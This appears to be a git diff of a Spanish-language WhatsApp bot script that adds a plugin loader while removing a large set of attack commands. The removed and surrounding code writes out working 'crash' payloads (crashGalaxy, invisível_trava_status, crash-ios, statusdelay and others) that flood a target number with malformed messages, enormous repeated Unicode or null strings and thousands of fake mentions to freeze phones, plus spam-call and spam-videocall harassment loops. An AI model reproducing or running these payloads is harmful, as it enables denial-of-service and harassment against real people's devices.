@@ -21,7 +21,7 @@ const {
 const fs = require('fs')
 //const 
 const web = fs.readFileSync('./src/opa.webp');
-const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(500);
+const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(500)
 const util = require('util')
 const chalk = require('chalk')
 const fetch = require('node-fetch')
@@ -32,8 +32,31 @@ const crypto = require('crypto');
 
 const path = require('path')
 
+let pluginsLoaded = false; // <--- AÑADE ESTA LÍNEA (NUESTRO INTERRUPTOR)
 module.exports = async (conn, m, chatUpdate, store, prefix) => {
 try {
+  if (!pluginsLoaded) {
+        conn.commands = new Map();
+        const pluginsPath = path.join(__dirname, 'plugins');
+        // LÍNEA CORRECTA
+const pluginFiles = fs.readdirSync(pluginsPath).filter(file => file.endsWith('.js'));
+
+        for (const file of pluginFiles) {
+            const filePath = path.join(pluginsPath, file);
+            const command = require(filePath);
+
+            if ('name' in command && 'execute' in command) {
+                conn.commands.set(command.name, command);
+                if (command.alias && Array.isArray(command.alias)) {
+                    command.alias.forEach(alias => conn.commands.set(alias, command));
+                }
+                console.log(`[PLUGINS] Cargado: ${command.name}`);
+            } else {
+                console.log(`[ADVERTENCIA] El plugin en ${filePath} no tiene la estructura correcta.`);
+            }
+        }
+        pluginsLoaded = true; // <-- Activamos el interruptor para que no se vuelva a ejecutar
+    }
 m.id = m.key.id
 m.chat = m.key.remoteJid
 m.fromMe = m.key.fromMe
@@ -460,151 +483,6 @@ async function blenklet(conn, target) {
 }
 
 
-async function yangBacaDev2(conn, jid, ptcp) {
-    let msg = generateWAMessageFromContent(jid, {
-        interactiveResponseMessage: {
-            contextInfo: {
-                mentionedJid: Array.from(
-                    { length: 2000 },
-                    (_, z) => `1313555020${z + 1}@s.whatsapp.net`
-                ),
-                isForwarded: true,
-                forwardingScore: 2085,
-                forwardedAiBotMessageInfo: {
-                    botJid: "13135550202@bot",
-                    botName: "Business Assistant",
-                    creator: "7eppeli"
-                },
-                participant: "13135550202@bot",
-                quotedMessage: {
-                    paymentInviteMessage: {
-                        serviceType: "UPI",
-                        expiryTimestamp: Date.now()
-                    }
-                },
-                remoteJid: "FineShyt"
-            },
-            body: {
-                text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘?",
-                format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-                name: "galaxy_message",
-                paramsJson: "{\"body\":\"7-Yuukey\",\"title\":\"7eppeli=Explorations\",\"title\":\"FVCK URSELF\"}"
-            }
-        }
-    }, { userJid: jid });
-
-    await conn.relayMessage(jid, msg.message, ptcp ? {
-        participant: { jid },
-        messageId: msg.key.id
-    } : {
-        messageId: msg.key.id
-    });
-}
-async function crashGalaxy(target) {
-let xios = "𑇂𑆵𑆴𑆿".repeat(333333) + "\u200B".repeat(333333) + "ހށނރ".repeat(333333)
-
-await generateWAMessageFromContent(target, proto.Message.fromObject({
-groupMentionedMessage: {
-message: {
-interactiveMessage: {
-header: {
-documentMessage: {
-url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
-mimetype: "application/json",
-fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
-fileLength: "999999999999",
-pageCount: 7.554679297577082e+23,
-mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-fileName: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏",
-fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
-directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
-              mediaKeyTimestamp: "1715880173"
-},
-hasMediaAttachment: true
-},
-body: {
-text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" + xios
-},
-nativeFlowMessage: {
-messageParamsJson: JSON.stringify({
-name: "galaxy_message",
-flow_action: "navigate",
-flow_action_payload: { screen: "CTZ_SCREEN" },
-flow_cta: "🍏",
-flow_id: "UNDEFINEDONTOP",
-flow_message_version: "9.903",
-flow_token: "UNDEFINEDONTOP"
-})
-},
-contextInfo: {
-mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
-groupMentions: [{
-groupJid: "1@newsletter",
-groupSubject: "UNDEFINEDONTOP"
-            }]
-          }
-        }
-      }
-    }
-  }), { userJid: target });
-
-await conn.relayMessage(
-target,
-{
-paymentInviteMessage: {
-serviceType: "APPLEPAY",
-expiryTimestamp: Date.now() + 1814400000
-      }
-    },
-    {
-      participant: { jid: target }
-    }
-  );
-
-await conn.relayMessage(target, {
-contactMessage: {
-displayName: "𝐏𝐎𝐒𝐄𝐭𝐎𝐍 𝐕𝟏" + "𑇂𑆵𑆴𑆿".repeat(60000),
-vcard: `BEGIN:VCARD
-VERSION:3.0
-N:☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>
-FN:☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>
-item1.TEL;waid=526421147692:526421147692
-item1.X-ABLabel:Click here to chat
-item2.EMAIL;type=INTERNET:YT: https://youtube.com/@p.a.zinwebkkkkj
-item2.X-ABLabel:YouTube
-item3.URL:INSTA: instagram.com/principeazul2.0
-item3.X-ABLabel:GitHub
-item4.ADR:;;Brasil, AM, SP;;;;
-item4.X-ABLabel:Region
-END:VCARD`,
-contextInfo: {
-forwardingScore: 2,
-isForwarded: true,
-isFromMe: true,
-externalAdenviar: {
-mediaType: 1,
-previewType: "NONE",
-sourceUrl: "https://youtube.com/@p.a.zinwebkkkkj"
-        }
-      }
-    }
-  }, {
-    quoted: m
-  });
-
-await conn.relayMessage(target, {
-locationMessage: {
-degreesLatitude: 173.282,
-degreesLongitude: -19.378,
-name: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" + "𑇂𑆵𑆴𑆿".repeat(60000),
-url: "https://youtube.com/@p.a.zinwebkkkkj"
-}
-}, {
-participant: { jid: target }
-});
-}
 
 async function forcepotter(target) {
 try {
@@ -1013,71 +891,72 @@ async function IosInvisibleForce(conn, target) {
   });
   console.log(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`)
 }
-async function invisível_trava_status(target, carousel = null) {
-  let sxo = await generateWAMessageFromContent(target, {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘?", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: "\x10".repeat(1045000),
-            version: 3
-          },
-          entryPointConversionSource: "galaxy_message",
-        }
-      }
+
+try {
+    const commandToExecute = conn.commands.get(command);
+
+    // Si el comando se encuentra en la colección de PLUGINS...
+    if (commandToExecute) {
+        
+        // 1. Creamos el objeto 'context' con todas las variables útiles
+        // En baron.js
+const context = {
+    isCreator,
+    pushname,
+    from,
+    from2,
+    prefix,
+    reply,
+    sender,
+    isBot,
+    q,
+    args,
+    text,
+    isGroup: m.isGroup,
+    groupMetadata,
+    participants,
+    groupAdmins,
+    isBotAdmins,
+    isAdmins,
+    // --- AÑADE ESTAS LÍNEAS NUEVAS ---
+   generateWAMessageFromContent,
+          getAggregateVotesInPollMessage,
+          downloadContentFromMessage,
+          prepareWAMessageMedia,
+          useMultiFileAuthState,
+          generateMessageID,
+          generateIOSMessageID,
+          generateWAMessage,
+          makeInMemoryStore,
+          DisconnectReason,
+          areJidsSameUser,
+          getContentType,
+          decryptPollVote,
+          relayMessage,
+          jidDecode,
+          Browsers,
+          getDevice,
+          proto,
+    proto,
+    cataui,
+    groupid,
+    candList,
+    sleep,
+    web,
+    sekzo3,
+    ios4,
+    ios6,
+
+  
+    // ---------------------------------
+};
+
+        // 2. Ejecutamos el plugin y salimos para no caer en el switch
+        return await commandToExecute.execute(conn, m, args, context);
     }
-  }, {
-    ephemeralExpiration: 0,
-    forwardingScore: 9741,
-    isForwarded: true,
-    font: Math.floor(Math.random() * 99999999),
-    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
-  });
-  let sXoMessage = {
-    extendedTextMessage: {
-      text: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
-      contextInfo: {
-        participant: target,
-        mentionedJid: [
-          "0@s.whatsapp.net",
-          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
-        ]
-      }
-    }
-  };
-  const xso = generateWAMessageFromContent(target, sXoMessage, {});
-  await conn.relayMessage("status@broadcast", xso.message, {
-    messageId: xso.key.id,
-    statusJidList: [target],
-    additionalNodes: [{
-      tag: "meta",
-      attrs: {},
-      content: [{
-        tag: "mentioned_users",
-        attrs: {},
-        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
-      }]
-    }]
-  });
-  await sleep(500);
-  // envia a primeira mensagem (sxo)
-  await conn.relayMessage("status@broadcast", sxo.message, {
-    messageId: sxo.key.id,
-    statusJidList: [target],
-    additionalNodes: [{
-      tag: "meta",
-      attrs: {},
-      content: [{
-        tag: "mentioned_users",
-        attrs: {},
-        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
-      }]
-    }]
-  });
-  await sleep(500);
-  console.log(`ATRASO INVISÍVEL`);
+} catch (error) {
+    console.error(`Error ejecutando el plugin '${command}':`, error);
+    return reply('Ocurrió un error al intentar ejecutar este comando.');
 }
 switch(command) {
   case "xhgr":
@@ -1337,154 +1216,7 @@ await conn.relayMessage(from, msg3.message, { messageId: msg3.key.id });
 }
 }
 break
-case "crash-ios3":
-if (!isBot && !isCreator) return
-if (!q) return reply(`Ejemplo\n ${prefix + command} +593xxx`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-for (let i = 0; i < 10; i++) {
-await loadedXios(target);
-await loadedXios(target);
-await loadedXios(target);
-await loadedXios(target);
-await loadedXios(target);
-await loadedXios(target);
-await loadedXios(target)
-}
-conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
-break
-case "crash-ios2":
-if (!isBot && !isCreator) return
-if (!q) return reply(`Ejemplo\n ${prefix + command} +52xxx`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-for (let i = 0; i < 10; i++) {
-await forcepotter(target);
-await forcepotter(target);
-await forcepotter(target);
-await forcepotter(target);
-await forcepotter(target);
-await forcepotter(target);
-await forcepotter(target);
-await forcepotter(target);
-await forcepotter(target);
-await forcepotter(target);
-await forcepotter(target)
-}
-conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
-break
-case "crash-ios4":
-if (!isBot && !isCreator) return
-if (!q) return reply(`Ejemplo ${prefix + command} +52xxx`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-for (let i = 0; i < 10; i++) {
-await crashGalaxy(target);
-await crashGalaxy(target);
-await crashGalaxy(target);
-await crashGalaxy(target);
-await crashGalaxy(target);
-await crashGalaxy(target);
-await crashGalaxy(target);
-await crashGalaxy(target)
-}
-conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
-break
-case 'spam-call': {
-   if (!isBot && !isCreator) return
-    if (!q) return reply(`Formato incorrecto. Ejemplo:\n${prefix + command} 543xxx,<cantidad>`);
 
-    let targetNumber;
-    let cantidad = 1;
-
-    if (q.includes(',')) {
-        const parts = q.split(',');
-        targetNumber = parts[0].replace(/[^0-9]/g, '');
-        const requestedCantidad = parseInt(parts[1].trim(), 10);
-        
-        if (!isNaN(requestedCantidad) && requestedCantidad > 0) {
-            cantidad = Math.min(requestedCantidad, 10);
-        }
-    } else {
-        targetNumber = q.replace(/[^0-9]/g, '');
-    }
-
-    if (!targetNumber) return reply('Número no válido.');
-
-    const target = targetNumber + "@s.whatsapp.net";
-
-    try {
-        // 1. Enviamos y guardamos el mensaje inicial
-        const sentMsg = await conn.sendMessage(from, {
-            text: `> Iniciando ${cantidad} llamadas a ${target.split('@')[0]}...`
-        }, { quoted: m });
-
-        for (let i = 0; i < cantidad; i++) {
-            await conn.offerCall(target);
-            console.log(`Llamada de voz #${i + 1} ofrecida a ${target}`);
-            if (cantidad > 1) {
-                await sleep(5000);
-            }
-        }
-
-        // 2. Editamos el mensaje original al finalizar
-        await conn.sendMessage(from, {
-            text: `> Se completo ${cantidad} llamada a ${target.split('@')[0]}.`,
-            edit: sentMsg.key
-        });
-
-    } catch (error) {
-        console.error(`Error al ofrecer llamada:`, error);
-        reply(`Error`);
-    }
-    break;
-}
-case 'spam-videocall': {
-    if (!isCreator) return reply('Este comando es solo para el creador.');
-    if (!q) return reply(`Formato incorrecto. Ejemplo:\n${prefix + command} 549xxx,<cantidad>`);
-
-    let targetNumber;
-    let cantidad = 1;
-
-    if (q.includes(',')) {
-        const parts = q.split(',');
-        targetNumber = parts[0].replace(/[^0-9]/g, '');
-        const requestedCantidad = parseInt(parts[1].trim(), 10);
-
-        if (!isNaN(requestedCantidad) && requestedCantidad > 0) {
-            cantidad = Math.min(requestedCantidad, 10);
-        }
-    } else {
-        targetNumber = q.replace(/[^0-9]/g, '');
-    }
-    
-    if (!targetNumber) return reply('Número no válido.');
-
-    const target = targetNumber + "@s.whatsapp.net";
-
-    try {
-        // 1. Enviamos y guardamos el mensaje inicial
-        const sentMsg = await conn.sendMessage(from, {
-            text: `> Iniciando ${cantidad} videollamada a ${target.split('@')[0]}...`
-        }, { quoted: m });
-
-        for (let i = 0; i < cantidad; i++) {
-            await conn.offerCall(target, { video: true });
-            console.log(`Videollamada #${i + 1} ofrecida a ${target}`);
-            if (cantidad > 1) {
-                await sleep(5000);
-            }
-        }
-
-        // 2. Editamos el mensaje original al finalizar
-        await conn.sendMessage(from, {
-            text: `> Se completo ${cantidad} videollamadas a ${target.split('@')[0]}.`,
-            edit: sentMsg.key
-        });
-
-    } catch (error) {
-        console.error(`Error al ofrecer videollamada:`, error);
-        reply(`Error`);
-    }
-    break;
-}
 case 'crash-button':
 for (let i = 0; i < 6; i++) {
 await conn.sendMessage(from, {
@@ -1637,86 +1369,6 @@ conn.relayMessage(from, {
 }, {});
 }
 break;
-case 'convite':{
-if (!isBot && !isCreator) return;
-await conn.relayMessage(from, {'groupInviteMessage': {'groupName': ' • 𝐂𝐫𝐚𝐬𝐡 𝐤𝐤𝐤𝐤𝐣𝐔' ,'groupJid': '6285709664923-1627579259@g.us','inviteCode': 'h+64P9RhJDzgXSPf','inviteExpiration': '999','caption': '𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏','contextInfo': {'fromMe': false,'participant': '0@s.whatsapp.net','remoteJid': sender,'quotedMessage': { 'listResponseMessage': { 'title': `☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </> ${ios6}` }}}}},{});
-}
-conn.relayMessage(from,{extendedTextMessage: {text: `𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`}},{})
-break;
-case "crash-ios":
-if (!isBot && !isCreator) return;
-for (let i = 0; i < 30; i++) {
-conn.relayMessage(from, {
-contactMessage: {
-displayName: "Xghr-BOT V2" + ios6,
-vcard: "BEGIN:VCARD\nVERSION:3.0\nN:𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏\nFN:🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>\nitem1.TEL;waid=69696969696969:69696969696969\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:YT: https://youtube.com/@p.a.zinwebkkkkj\nitem2.X-ABLabel:YouTube\nitem3.URL:INSTA: instagram.com/web_retired\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;Brasil, AM, SP;;;;\nitem4.X-ABLabel:Region\nEND:VCARD",
-contextInfo: {
-forwardingScore: 2,
-isForwarded: true,
-isFromMe: true,
-externalAdreply: {
-mediaType: 1,
-previewType: "NONE",
-sourceUrl: `https://xnnx.com`,
-}            
-}
-}
-},
-{
-quoted: info
-}
-)
-}
-break
-case 'atraso': 
-  if (!isBot && !isCreator) return
-  conn.sendMessage(m.chat, { react: { text: '⏳️', key: m.key } })
-
-  const imagePath = './media/ola.jpg'
-  const url = 'https://chat.whatsapp.com/PENE'
-  const title = `\n${url}\n`
-  const button = {
-    name: "cta_url",
-    buttonParamsJson: JSON.stringify({
-      display_text: '',
-      url,
-      merchant_url: url
-    })
-  }
-
-  const media = await prepareWAMessageMedia({ image: { url: imagePath } }, { upload: conn.waUploadToServer })
-  const header = proto.Message.InteractiveMessage.Header.create({
-    ...media,
-    title,
-    gifPlayback: true,
-    subtitle: " ",
-    hasMediaAttachment: false
-  })
-
-  const cardTemplate = {
-    header,
-    body: { text: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛" },
-    nativeFlowMessage: { buttons: [button] }
-  }
-
-  const cards = Array(25).fill(cardTemplate) // Puedes ajustar la cantidad aquí
-
-  for (let i = 0; i < 30; i++) {
-    await conn.relayMessage(from, {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            body: { text: '🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛' + "\0\0\0\0\0\0\0\0\0".repeat(0x1869f) },
-            carouselMessage: { cards }
-          }
-        }
-      }
-    }, { participant: { jid: from } })
-  }
-
-  conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
-  break
-
 
 case "statusbox": 
   try {
@@ -1724,200 +1376,6 @@ case "statusbox":
   } catch (e) {
   }
   break;
-case 'button':
-if (!isBot && !isCreator) return
-if (m.isGroup && groupid.includes(m.chat)) {
-    return reply("❎❎❎❎");
-}
-await conn.sendMessage(from, {
-image: { url: './src/foto.jpg' },
-"contextInfo": {
-  "externalAdReply": {
-    "title": `𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`,
-    "body": 'ola',
-    "mediaType": 4,
-    "thumbnail": web,
-"jpegThumbnail": web,
-    "MediaUrl": 'SEKKKK',
-    "sourceUrl": 'KKKK'
-  }
-},
-caption: `☠️⃟⿻Xghr ϟ 𝐕𝟒⿻⃟☠️`,
-footer: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
-buttons: [
-  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100) }, type: 10 },
-  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
-  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
-  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
-{ buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
-  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
-],
-
-headerType: 1,
-viewOnce: true
-});
-break; 
-case "atraso-package": {
-    if (!isBot && !isCreator) return;
-
-    let pelaku = m.mentionedJid && m.mentionedJid.length > 0
-        ? m.mentionedJid[0]
-        : m.quoted
-            ? m.quoted.sender
-            : (q ? q.replace(/[^0-9]/g, '') : null);
-
-    if (!pelaku) return reply(" Ingresa un número válido.");
-
-    let target = pelaku.includes('@s.whatsapp.net') ? pelaku : pelaku + "@s.whatsapp.net";
-    let xgr = 5;  
-    for (let i = 0; i < xgr; i++) {
-        blenklet(conn, target)
-    }
-
-    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
-}
-break;
-case 'statusdelay':
-if (!isBot && !isCreator) return
-conn.sendMessage(m.chat, {react: {text: '⏳️', key: m.key}})
-for (let i = 0; i < 800; i++) {
-  let msg = await generateWAMessageFromContent(from, {
-buttonsMessage: {
-text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
-contentText: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 ⚡️",
-      buttons: [
-        {
-          buttonId: ".null",
-          buttonText: {
-            displayText: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘" + "\u0000".repeat(500000),
-          },
-          type: 1,
-        },
-      ],
-      headerType: 1,
-    },
-  }, {});
-  await conn.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [from],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: from },
-                content: undefined,
-              },
-            ],
-          },
-        ],
-      },
-    ],
-  });
-
-  if (isCreator) {
-    await conn.relayMessage(
-      from,
-      {
-groupStatusMentionMessage: {
-          message: {
-            protocolMessage: {
-              key: msg.key,
-              type: 25,
-            },
-          },
-        },
-      },
-      {
-additionalNodes: [
-{
-tag: "meta",
-attrs: {
-is_status_mention: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
-},
-content: undefined,
-},
-],
-}
-);
-}
-}
-conn.sendMessage(m.chat, {react: {text: '✅️', key: m.key}})
-break
-
-case "crash-chat": {
-    if (!isBot && !isCreator) return;
-  for (let i = 0; i < 3; i++) {
-    yangBacaDev2(conn, from)
-    await sleep(8000)
-    yangBacaDev2(conn, from)
-    await sleep(8000)
-    yangBacaDev2(conn, from)
-    await sleep(8000)
-    yangBacaDev2(conn, from)
-    await sleep(8000)
-    yangBacaDev2(conn, from)
-    
-    }
-    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
-    
-}
-break;
-
-case 'play': {
-  if (!isBot) return
-    if (!q) return reply('`Ingresa el nombre de la canción`');
-    
-    try {
-        // 1. OBTENER INFO Y AUDIO URL DE LA API
-        const apiUrl = `https://api.nexfuture.com.br/api/downloads/youtube/play?query=${encodeURIComponent(q)}`;
-        const response = await fetch(apiUrl);
-        if (!response.ok) throw new Error(`La API de música falló: ${response.status}`);
-        
-        const songData = await response.json();
-        if (!songData.status || !songData.resultado) return reply('No se encontraron resultados para esa canción.');
-        
-        const { imagem, titulo, desc, tempo, views, audio: audioUrl } = songData.resultado;
-        const caption = `> *Título:* ${titulo}\n> *Duración:* ${tempo}\n> *Vistas:* ${views}\n\n\`_Procesando audio en el búnker..._\``;
-        
-        await conn.sendMessage(from, { 
-            image: { url: imagem }, 
-            caption 
-        }, { quoted: m });
-
-        // 2. DELEGAR LA CONVERSIÓN AL MICROSERVICIO (CERO BLOQUEO)
-        const conversionResponse = await fetch('http://localhost:3000/convert', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ audioUrl: audioUrl, title: titulo })
-        });
-
-        if (!conversionResponse.ok) {
-            console.error('El servicio de conversión devolvió un error:', await conversionResponse.text());
-            throw new Error('El búnker de conversión falló.');
-        }
-
-        const opusBuffer = await conversionResponse.buffer();
-
-        // 3. ENVIAR EL RESULTADO FINAL
-        await conn.sendMessage(from, { 
-            audio: opusBuffer, 
-            mimetype: 'audio/ogg; codecs=opus', 
-            ptt: false
-        }, { quoted: m });
-
-    } catch (err) {
-        console.error(err);
-        reply(`Error al procesar la canción.`);
-    }
-}
-break;
 case 'nuke': {
 
   if (!isBot) return 
@@ -1954,251 +1412,6 @@ case 'nuke': {
 }
   break;
 
-case 'tt':
-case 'tiktok': {
-  if (!isBot) return
-    if (!q) return eply('*Ingresa el enlace del video de tiktok');
-    try {
-        const apiUrl = `https://api.dorratz.com/v2/tiktok-dl?url=${encodeURIComponent(q)}`;
-        const noze = await fetch(apiUrl);
-        if (!noze.ok) throw new Error(`Error API ${noze.status}`);
-        const json = await noze.json();
-        if (!json.status || !json.data) return reply('No se encontró el video.');
-        const { title, duration, repro, like, share, comment, author, music, media } = json.data;
-        const caption = `
-> *Título:* \`${title}\`
-> *Autor:* ${author.nickname} (${author.username})
-> *Música:* ${music.title}
-> *Duración:* ${duration}s
-> *Reproducciones:* ${repro}
-> *Likes:* ${like}
-> *Comentarios:* ${comment}
-> *Compartidos:* ${share}
-        `;
-const urlx = media.hd || media.org;
-await conn.sendMessage(from, { 
-    video: { url: urlx }, 
-       caption: caption.trim()
-        }, { quoted: m });
-
-    } catch (err) {
-        console.error(err);
-        reply('Error');
-    }
-}
-break;
-
-case "home-ios": {
-    if (!isBot && !isCreator) return;
-
-    let pelaku = m.mentionedJid && m.mentionedJid.length > 0
-        ? m.mentionedJid[0]
-        : m.quoted
-            ? m.quoted.sender
-            : (q ? q.replace(/[^0-9]/g, '') : null);
-
-    if (!pelaku) return reply(" Ingresa un número válido.");
-
-    let target = pelaku.includes('@s.whatsapp.net') ? pelaku : pelaku + "@s.whatsapp.net";
-    if (candList.includes(target)) {
-        //kkkkk
-        await conn.sendMessage(m.chat, { 
-            text: `Nel, con el owner no ` 
-        }, { quoted: m });
-        await conn.sendMessage("593969533280@s.whatsapp.net", { 
-            text: `User *${m.sender}* intentó follar a ${target}.`
-        });
-        return;
-    }
-    crashiOS(target)
-    await sleep(3000)
-    crashiOS(target)
-    await sleep(3000)
-    crashiOS(target)
-    await sleep(3000)
-    crashiOS(target)
-    await sleep(3000)
-    crashiOS(target)
-    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
-}
-break;
-case 'catalogo-ios':{
-if (!isBot && !isCreator) return
-var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/ola.jpg') }, { upload: conn.waUploadToServer })
-var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
-"productMessage": {
-"product": {
-"productImage": messa.imageMessage,
-"productId": "449756950375071",
-"title": "🎠" + cataui,
-"description": cataui,
-"currencyCode": `BRL`,
-"footerText": cataui,
-"priceAmount1000": "1000000000",
-"productImageCount": 1,
-"firstImageId": 1,
-"salePriceAmount1000": "1000000000",
-"retailerId": ` `,
-"url": "wa.me/9473839229292"
-},
-"businessOwnerJid": "526421147692@s.whatsapp.net",
-}
-}), { userJid: from })
-conn.relayMessage(from, catalog.message, { messageId: catalog.key.id })
-}
-break 
-
-
-case "lin":
-if (!isBot && !isCreator) return
-    {
-      let resultText = "Infos:\n";
-      if (m.isGroup) {
-        for (const jid of participants) {
-          await sleep(1000);
-          let res = await conn.fetchStatus(jid.jid);
-          let status = res[0]?.status.status || "";
-          let setAt = res[0]?.status.setAt || "";
-          let id = res[0]?.id || "";
-        resultText += `Id: *${id}*\nStatus: *${status}*\nTime: *${setAt}*\n---------------------------\n`;
-          await sleep(1000);
-        }
-        await conn.sendMessage(from, { text: resultText });
-      } else {
-        let res = await conn.fetchStatus(from);
-        console.log(res);
-        let status = res[0]?.status.status || "";
-        let setAt = res[0]?.status.setAt || "";
-        let id = res[0]?.id || "";
-        resultText += `Id: *${id}*\nStatus: *${status}*\nTime: *${setAt}*\n---------------------------\n`;
-        await conn.sendMessage(from, { text: resultText });
-      }
-    }
-    break;
-
-case 'tag': {
-if (!isBot) return;
-    if (!m.isGroup) return reply("Este comando solo funciona en grupos")
-    
-    let metadata = await conn.groupMetadata(m.chat)
-    let participantes = metadata.participants.map(u => u.id)
-
-    await conn.sendMessage(m.chat, {
-        text: "",
-        mentions: participantes
-    }, { quoted: m.quoted ? m.quoted : info })
-}
-break
-    case 'menu':
-    if (!isBot && !isCreator) return 
-
-    const os = require('os');
-    const moment = require('moment-timezone');
-    
-    var deviceType = m.key.id.length > 21 ? 'Android' : m.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp Web';
-    const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
-    const data = moment.tz('America/Sao_Paulo').format('DD/MM/YY');
-
-  const menuzz = fs.readFileSync('./src/thumb.jpg');
-
-    await conn.sendMessage(from, {
-        image: { url: './src/foto.jpg' },
-        contextInfo: {
-            externalAdReply: {
-                title: `𝐏.𝑐ℎ𝑜𝑐𝑜𝑐𝑟𝑖𝑠𝑝𝑦`,
-                body: `𝐵𝑂𝑇 𝑉𝐼𝑃`,
-                mediaType: 4,
-                thumbnail: menuzz,
-                jpegThumbnail: menuzz,
-                mediaUrl: 'KKKKK',
-                sourceUrl: 'KKKK'
-            }
-        },
-        caption: `
-╭⪫═════════════════⪫
-│  𝐵𝑂𝑇 𝑉𝐼𝑃
-│  \`Usuario\`: ${pushname}
-│  \`Hora:\` ${hora}
-│  \`Fecha:\` ${data}
-│  \`Estado:\` Online
-│  \`Dispositivo:\` ${deviceType}
-│  \`Plataforma:\` ${os.platform()}
-│  \`HostName:\` ${os.hostname()}
-╰═════════════════╯
-  *LISTA DE COMANDOS*
-  ANDORID
-> statusbox
-> statusdelay
-> atraso
-> crash-ui
-> crash-button
-> crash-Chat
-> chat-freeze
-> atraso-new +593xxx
-> crash-chat
-> button
-  IOS 
-  Crash-ios
-> crash-invisible
-> crash-ios2 +52xxx
-> crash-ios3 +52xxx
-> crash-ios4 +52xxx
-> home-ios 593xxxx
-> catalogo-ios 593xxx
-  ADD
-> spam-call +593xxx,<cantidad>  
